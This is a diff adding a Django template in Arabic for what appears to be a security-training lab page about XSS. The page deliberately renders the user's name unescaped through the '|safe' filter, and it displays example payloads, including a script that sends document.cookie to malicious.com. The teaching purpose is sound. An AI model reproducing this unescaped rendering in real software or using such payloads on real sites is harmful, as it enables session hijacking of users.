@@ -1,0 +1,76 @@
+{% extends "./base.html" %} {% load static %}
+{% block title %}XSS الضعيف {% endblock %} 
+{% block hero %}
+<div
+  class="bg-image"
+  style="
+    background-image: url('{% static 'cyper_app/img/xss.jpg' %}');
+    min-height: 87vh;
+  "
+  id="mainContent">
+  <div class="bg-overlay h-100">
+    <div class="container content-overlay py-5">
+      <h1 class="display-4">مرحبًا، {{ name|safe }}</h1>
+      <div class="lead">
+        <form class="mb-3">
+          <div class="mb-3">
+            <label for="name" class="form-label">أدخل اسمك:</label>
+            <input
+              dir="ltr"
+              type="text"
+              class="form-control"
+              id="name"
+              name="name" />
+          </div>
+          <button type="submit" class="btn btn-primary">إرسال</button>
+        </form>
+      </div>
+      <hr class="my-4" />
+      <p>استكشف أهم الأوامر المستخدمة في هذه الثغرة.</p>
+      <button class="btn btn-primary btn-lg" id="learnMoreBtn">
+        تعلم المزيد
+      </button>
+      <div class="hacking-info" id="hackingInfo">
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>مثال بسيط حول XSS</h3>
+            <div class="viewport" direction="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code>&lt;script&gt;alert('XSS Attack');&lt;/script&gt;</code>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <hr class="my-4" />
+        <div class="hacking-item">
+          <div class="hacking-text">
+            <h3>مثال على سرقة الكوكيز (Cookie Theft)</h3>
+            <div class="viewport" direction="ltr">
+              <div class="card">
+                <div class="header">
+                  <div class="dot red"></div>
+                  <div class="dot yellow"></div>
+                  <div class="dot green"></div>
+                </div>
+                <div class="content">
+                  <code
+                    >&lt;script&gt;fetch('http://malicious.com/steal?cookie=' +
+                    document.cookie);&lt;/script&gt;</code
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
